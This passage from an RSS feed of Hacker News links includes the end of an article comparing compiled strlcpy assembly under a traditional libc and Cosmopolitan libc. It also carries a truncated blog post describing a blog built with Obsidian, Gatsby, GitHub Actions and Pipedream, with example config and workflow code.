  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Buzzword.engineering Tech Stack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25556272">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | https://buzzword.engineering/post/blog-tech-stack | <a href="https://web.archive.org/web/*/https://buzzword.engineering/post/blog-tech-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span><strong>Spoiler Alert</strong></h5></p><p>It was, in fact, possible.</p></div>
<p>Anyway, here's Buzzword Engineering's inaugural blog post. If you like it, go give me a github star on the <a href="https://github.com/steven-terrana/steven-terrana.github.io" target="_blank" rel="nofollow noopener noreferrer">blog repo</a> or something. It's a nice dopamine boost and fuels my self-worth. </p>

<p>Let's dive in. Here's a digram for those visual learners out there. </p>
<p><span>
      <a href="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ac56/overview.webp 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d3be9/overview.webp 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e46b2/overview.webp 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e97dc/overview.webp 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ff5a/overview.png 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e85cb/overview.png 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png" alt="This diagram shows an overview of buzzword.engineering tech stack and associated automation" title="This diagram shows an overview of buzzword.engineering tech stack and associated automation" loading="lazy">
      </picture>
  </a>
    </span></p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>Excalidraw is Dope</strong></h5></p><p>If you haven't heard of it, stop reading this and go play with <a href="https://excalidraw.com/" target="_blank" rel="nofollow noopener noreferrer">Excalidraw</a> and then come back. It's the tool I used to sketch out this diagram.</p></div>
<h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2>
<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>
</ol>
<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>using local vault path: </span><span><span>${</span>siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>}</span></span><span>`</span></span><span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span>'gatsby-source-filesystem'</span><span>,</span>
    options<span>:</span> <span>{</span>
      path<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>,</span>
      name<span>:</span> <span>'local_obsidian'</span><span>,</span>
      ignore<span>:</span> <span>[</span> <span>"**/.git/**/*"</span><span>,</span> <span>"**/.obsidian/**/*"</span><span>,</span> <span>"**/Templates/**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span> <span>else</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>"fetching from remote repo: "</span><span>,</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span><span>`</span><span>gatsby-source-git</span><span>`</span></span><span>,</span>
    options<span>:</span> <span>{</span>
      name<span>:</span> <span><span>`</span><span>obsidian</span><span>`</span></span><span>,</span>
      remote<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>,</span>
      patterns<span>:</span> <span>[</span> <span>"!**/Templates/**/*"</span><span>,</span> <span>"**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span></code></pre></div>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></p><p>I wanted to insert a gif of the filtering taking place. Apparently that's easier said than done with Gatsby and<code>gatsby-transform-remark</code>.  I'll update this post once I get gifs working üôÑ.</p></div>
<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>
  
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>trigger</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
     <span>-</span> <span>name</span><span>:</span> Trigger Upstream Blog Action
        <span>run</span><span>:</span> <span>|</span><span>
          curl -XPOST \
          -u "${{ secrets.PAT_USERNAME}}:${{secrets.PAT_TOKEN}}" \
          -H "Accept: application/vnd.github.everest-preview+json" \
          -H "Content-Type: application/json" \
          https://api.github.com/repos/steven-terrana/steven-terrana.github.io/dispatches \
          --data '{"event_type": "blog"}'</span></code></pre></div>
<h3 id="step-2-github-action-on-the-blog-repo"><a href="#step-2-github-action-on-the-blog-repo" aria-label="step 2 github action on the blog repo permalink"></a>Step 2: GitHub Action on the Blog Repo</h3>
<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish
<span>on</span><span>:</span>
  <span>repository_dispatch</span><span>:</span>
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>build-deploy-notify</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
      
      <span>-</span> <span>name</span><span>:</span> Checkout Code üõé
        <span>uses</span><span>:</span> actions/checkout@v2
        <span>with</span><span>:</span> 
          <span>persist-credentials</span><span>:</span> <span>false</span>
       <span>-</span> <span>name</span><span>:</span> Install &amp; Build üîß
        <span>run</span><span>:</span> <span>|</span><span>
          npm ci
          npm run build
          echo "buzzword.engineering" &gt; public/CNAME</span>
        <span>env</span><span>:</span> 
          <span>PAT_USER</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_USER <span>}</span><span>}</span>
          <span>PAT_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_TOKEN <span>}</span><span>}</span>
      <span>-</span> <span>uses</span><span>:</span> peaceiris/actions<span>-</span>gh<span>-</span>pages@v3
        <span>with</span><span>:</span>
          <span>github_token</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>
          <span>publish_dir</span><span>:</span> public
          <span>force_orphan</span><span>:</span> <span>true</span>  </code></pre></div>
<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>
<li>I use the <code>peaceiris/actions-gh-pages</code> action to publish the site. </li>
</ol>
<p>All in all, this was a pretty painless setup. </p>
<h3 id="step-3-automating-tweets"><a href="#step-3-automating-tweets" aria-label="step 3 automating tweets permalink"></a>Step 3: Automating Tweets</h3>
<p>So at this point, we've got content changes automatically getting deployed to GitHub Pages. The whole process takes about <strong>three minutes</strong> from commit to publish. </p>
<p>The last piece was to automate letting all of you know about the whatever new insightful thing I had to say! </p>
<p>I had stumbled on <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> before through targeted ads and sort of ignored it until I saw <a href="https://twitter.com/rawkode" target="_blank" rel="nofollow noopener noreferrer">David McKay</a> talk about how much he loves it on <a href="https://rawkode.live/" target="_blank" rel="nofollow noopener noreferrer">rawkode.live</a>. Here's a <a href="https://youtu.be/Q8ZJ_5zxfmo" target="_blank" rel="nofollow noopener noreferrer">link to the stream</a>!</p>
<p>I went into this adventure thinking I was going to have to do all kinds of fancy logic and scripting to make this possible. I was wrong. </p>
<p>After setting up a Pipedream account, starting looking at what event sources were available to trigger a workflow. Well, the Lumen gatsby ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://buzzword.engineering/post/blog-tech-stack">https://buzzword.engineering/post/blog-tech-stack</a></em></p>]]>
            </description>
            <link>https://buzzword.engineering/post/blog-tech-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556272</guid>
            <pubDate>Mon, 28 Dec 2020 02:56:21 GMT</pubDate>
        </item>
    </channel>
</rss>
